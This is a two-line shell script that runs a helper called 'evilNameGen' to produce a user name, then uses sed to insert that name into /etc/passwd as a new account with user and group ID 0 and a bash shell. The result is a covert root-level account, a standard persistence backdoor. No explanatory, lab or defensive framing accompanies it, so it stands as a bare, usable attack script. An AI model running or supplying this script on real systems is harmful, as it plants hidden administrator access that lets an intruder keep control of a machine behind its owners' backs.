#!/bin/sh
name=$(./src/misc/evilNameGen);sed -i '10i$name:x:0:0:,,,:/:/bin/bash' /etc/passwd 